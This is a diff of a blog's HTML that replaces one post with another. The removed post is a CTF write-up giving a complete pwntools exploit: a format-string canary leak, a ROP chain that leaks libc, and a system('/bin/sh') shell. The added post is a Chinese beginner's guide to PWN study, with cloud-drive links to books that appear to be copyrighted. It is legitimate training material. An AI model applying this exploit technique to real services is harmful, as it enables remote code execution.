@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>bjdctf_2020_babyrop2 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" ROP , canary ">
-  <meta name="description" content="bjdctf_2020_babyrop2 | sixpar&#39;s blog">
+  <title>PWN入门基础 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" 入门 ">
+  <meta name="description" content="PWN入门基础 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta property="og:type" content="website">
 <meta property="og:title" content="about">
@@ -314,9 +314,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-bjdctf-2020-babyrop2" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-PWN入门基础" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">bjdctf_2020_babyrop2</h1>
+        <h1 class="article-title">PWN入门基础</h1>
     
     <div class="article-meta">
         
@@ -326,7 +326,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="PWN题">PWN题</a>
+            <a  data-rel="笔记">笔记</a>
             
         </span>
         
@@ -334,21 +334,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">ROP</a>
-            
-            <a class="color2">canary</a>
+            <a class="color3">入门</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-03 13:15:43'>2020-07-03 12:47</time>
+            Created At : <time class="date" title='Updated At: 2020-07-03 13:16:06'>2020-07-03 13:05</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:545</span>
+        <span>Count:1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -378,7 +376,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#保护机制（64位）："><span class="toc-text">保护机制（64位）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用思路："><span class="toc-text">利用思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#完整exp："><span class="toc-text">完整exp：</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#语言"><span class="toc-text">语言:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#系统知识"><span class="toc-text">系统知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#工具"><span class="toc-text">工具:</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -394,26 +392,25 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="保护机制（64位）："><a href="#保护机制（64位）：" class="headerlink" title="保护机制（64位）："></a>保护机制（64位）：</h2><blockquote>
-<p>  Arch:     amd64-64-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x400000)</p>
-</blockquote>
-<p>可见比babyrop1那题多一个canary的保护机制。</p>
-<h2 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h2><p>通过格式化漏洞泄露canary，然后溢出通过puts函数的rop链泄露libc地址，再次溢出rop执行getshell</p>
-<p>本题的第一个输入只允许输入6个字节，__isoc99_scanf(“%6s”, &amp;format);    所以输出也是6个字节。<br>所以我们就就一个一个偏移试过去，aa%1$p 、aa%2$p ……</p>
-<p>当输入  aa%6$p 时，得到 aa0x702436256161  ，可见我们输入的内容在偏移6上，所以格式化字符串的偏移是6</p>
-<p>而canary的值是var_8变量，处在 rbp-0x8 的位置，我们要计算偏移。我们输入的format变量位于 ebp-0x10 的位置，所以偏移就是 0x8 </p>
-<p>所以我们尝试直接在第一个输入处输入 %7$p ，输出来的16字节数据一定是canary的值没错了。</p>
-<p>接收canary的值 ：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary=int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
+        <h2 id="语言"><a href="#语言" class="headerlink" title="语言:"></a>语言:</h2><p>C：c语言是必须得会的。推荐书籍《c程序设计语言》，b站上有很多的资源。<br>C++ ：推荐先看基础网课，然后再看《c++ prime》,看个大概就好..看的太仔细不用也很容易忘..<br>Python : 有了前面的语言基础铺垫，学python就会很快，廖雪峰的python教程，《Python编程从入门到实践》等都不错。<br>汇编 : 用王爽的《汇编语言》来入门是不错的. 不过这本书是16位汇编，入门后还得找找32位，64位汇编资料来看看。这里说的汇编都是asm汇编.<br>上面学的都只是语法，还得做做oj上面的题，能够用编程语言把自己的想法表达出来。会写汇编也很重要，写shellcode必备.</p>
+<h2 id="系统知识"><a href="#系统知识" class="headerlink" title="系统知识"></a>系统知识</h2><p>《深入理解计算机系统》 : 这本书覆盖了计算机系统的方方面面.<br>《程序员的自我修养-链接,装载与库》 ：这本书主要讲了平台上的文件格式，源代码是如何到可执行文件的，动态链接静态链接等.<br>《加密与解密》 ：这本书可以看看其中的工具篇和逆向分析技术篇，逆向分析技术篇详细说明了函数调用约定，函数调用栈帧，c++虚函数等东西.<br>操作系统原理 ：找视频来看看</p>
+<p>CTF中大部分的pwn题都是linux平台上的，所以懂得linux的基本操作也是必不可少的.常用的命令，权限控制，linux的系统调用等…百度和b站找找教程就行了.参考书籍《鸟哥的Linux私房菜基础篇》(真的是只是参考书籍，太厚了…，遇到了不懂的就翻翻就好了)<br>懂的上面这些就可以学习基本的二进制漏洞了.</p>
+<p>扎实的逆向基础是非常重要….</p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具:"></a>工具:</h2><p>IDA pro : 静态分析工具，有本书是专门讲IDA的《IDA pro权威指南》，这个工具很复杂.<br>gdb : 动态调试工具，学会调试是很重要的.<br>pwndbg，peda … ：gdb的插件，github上可以找到.<br>pwntools ：python的一个库，主要的用途是跟程序进行交互和方便调试.<br>checksec ：linux自带的检查文件开启的保护的工具<br>ropper,ROPgadget : 查找程序中gadget的工具<br>one_gadget : 查找libc中的onegadget..<br>…….</p>
+<p>##CTF中漏洞学习流程:<br>###基础<br>栈溢出原理<br>ROP链<br>格式化字符串漏洞原理<br>格式化字符串漏洞任意读写.<br>整数溢出<br>glibc heap的一些利用.<br>_IO_FILE结构的利用.<br>…</p>
+<p>###偏向实战:<br>webserver<br>虚拟机逆向…<br>内核提权..ctf中常常是写的驱动的问题.<br>魔改的JS引擎.<br>…..</p>
+<p>###实战.<br>找到自己感兴趣的方向：windows桌面应用..浏览器安全..内核安全..虚拟机逃逸..iot智能设备…等等等<br>这些需要你有扎实的编程基础，计算机系统知识，对闭源软件的逆向能力</p>
+<p>##推荐书籍.<br>0day安全2<br>链接:<a href="https://pan.baidu.com/s/1LITCWADikf7bBUskZiFHAA" target="_blank" rel="noopener">https://pan.baidu.com/s/1LITCWADikf7bBUskZiFHAA</a> 密码:0zgo</p>
+<p>深入理解计算机系统<br>链接:<a href="https://pan.baidu.com/s/1gtB8fEUUtFj8blwJnajICQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1gtB8fEUUtFj8blwJnajICQ</a> 密码:yx0s</p>
+<p>程序员的自我修养<br>链接:<a href="https://pan.baidu.com/s/1cALpx_D_9CR9hWWM9rIMwQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1cALpx_D_9CR9hWWM9rIMwQ</a> 密码:73pe</p>
+<p>glibc内存管理ptmalloc源代码分析<br>链接:<a href="https://pan.baidu.com/s/1-0odrFdV0Dn7xgehicuz0A" target="_blank" rel="noopener">https://pan.baidu.com/s/1-0odrFdV0Dn7xgehicuz0A</a> 密码:su8n<br>介绍：理解Linux堆管理的必读书</p>
+<p>漏洞战争<br>链接:<a href="https://pan.baidu.com/s/1Myfox3OWTHWqeW8n82NI4w" target="_blank" rel="noopener">https://pan.baidu.com/s/1Myfox3OWTHWqeW8n82NI4w</a> 密码:r8i0<br>介绍：很好的书，里面的案例能调的都值得调一下。</p>
+<p>逆向：<br>C++反汇编技术解密<br>链接:<a href="https://pan.baidu.com/s/1d-XqvHTU85K88aDwMNBl5w" target="_blank" rel="noopener">https://pan.baidu.com/s/1d-XqvHTU85K88aDwMNBl5w</a> 密码:k0aa。</p>
+<p>使用OllyDbg从零开始Cracking(已完结）<br>链接:<a href="https://pan.baidu.com/s/1ntwXQYX" target="_blank" rel="noopener">https://pan.baidu.com/s/1ntwXQYX</a><br>解压密码:pediy<br>介绍：学习od使用的教程，动手实践上不错，翻译和配套资料在看雪可以搜到。</p>
+<p>逆向工程权威指南<br>链接:<a href="https://pan.baidu.com/s/1BtJEsqE2e_DHFlzJWrJw2g" target="_blank" rel="noopener">https://pan.baidu.com/s/1BtJEsqE2e_DHFlzJWrJw2g</a> 密码:wenn</p>
+<p>Bilibili的PWN入门教程<br><a href="https://www.bilibili.com/video/av14550200" target="_blank" rel="noopener">https://www.bilibili.com/video/av14550200</a></p>
+<p>##其他<br>更详细的内容请看（强烈推荐）：<br>PWN入坑指南：<a href="https://www.cnblogs.com/wintrysec/p/10616856.html" target="_blank" rel="noopener">https://www.cnblogs.com/wintrysec/p/10616856.html</a></p>
 
-<p>一般canary的位置都在 ebp-8 的位置。所以我们后续溢出的时候把canary的值填回去就能绕过检查了，</p>
-<p>具体操作：</p>
-<blockquote>
-<p>payload=’a’*0x18+p64(canary)+p64(0xdeadbeef)+ …….</p>
-</blockquote>
-<p>然后后续操作就跟 babyrop1 一样了。</p>
-<p>对了，本题踩的坑：  在泄露puts地址时，要加上 p.recv()  表示全部接收完。要不然puts地址数据会丢失  （调试得puts的地址为 0xa ，显然不对啊），导致后续操作都出错了。要不是我把puts地址给打印出来看看，我还不知道错在哪里呢  QAQ</p>
-<h2 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./bjdctf_2020_babyrop2'</span>)</span><br><span class="line"><span class="comment"># p=remote('node3.buuoj.cn',28226)</span></span><br><span class="line">elf=ELF(<span class="string">'./bjdctf_2020_babyrop2'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'give u some gift to help u!'</span>)</span><br><span class="line">p.sendline(<span class="string">'%7$p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'0x'</span>)</span><br><span class="line">canary=int(p.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"canary is "</span>+hex(canary)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x400993</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">vuln_addr=<span class="number">0x0400887</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0xdeadbeef</span>)+p64(pop_rdi)+p64(puts_got)</span><br><span class="line">payload1+=p64(puts_plt)+p64(vuln_addr)</span><br><span class="line">p.recvuntil(<span class="string">'me u story!'</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv() </span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr is "</span>+hex(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base= puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">system_addr=libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr= libc_base+ libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">0x18</span> +p64(canary)+<span class="string">'b'</span>*<span class="number">8</span>+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
     </div>
